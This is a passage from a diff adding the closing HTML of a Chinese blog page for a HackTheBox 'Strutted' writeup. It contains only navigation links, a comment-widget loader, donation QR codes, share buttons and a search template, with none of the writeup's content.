+        <h4 class="title">HackTheBox——HTB Support Writeup</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next fr">
+      <a href="/2025/06/19/Eureka/Eureka/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">HackTheBox——HTB Eureka Writeup</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+            
+            
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="HackTheBox——HTB Strutted Writeup/HackTheBox——HTB Strutted Writeup" data-title="HackTheBox——HTB Strutted Writeup" data-url="http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/index.html"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"ysblog"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+        </div>
+    </div>
+</article>
+
+<div id="reward" class="reward-lay">
+    <a class="reward-off" id="rewardOff" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <ul class="reward-items">
+        
+        <li>
+            <img src="/img/wechat.jpg" title="微信打赏二维码" alt="微信打赏二维码">
+            <p>微信</p>
+        </li>
+        
+
+        
+        <li>
+            <img src="/img/alipay.jpg" title="支付宝打赏二维码" alt="支付宝打赏二维码">
+            <p>支付宝</p>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+  </main>
+<div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+<script>
+var BLOG_SHARE = {
+    title: "HackTheBox——HTB Strutted Writeup",
+    pic: "/img/logo.jpg",
+    summary: document.getElementsByName('summary')[0].content,
+    url: "http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/index.html"
+};
+</script>
+<div class="global-share" id="global-share">
+    <div class="tit">分享到：</div>
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
+          豆
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<script type="text/template" id="search-tpl">
+<li class="item">
+    <a href="/{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
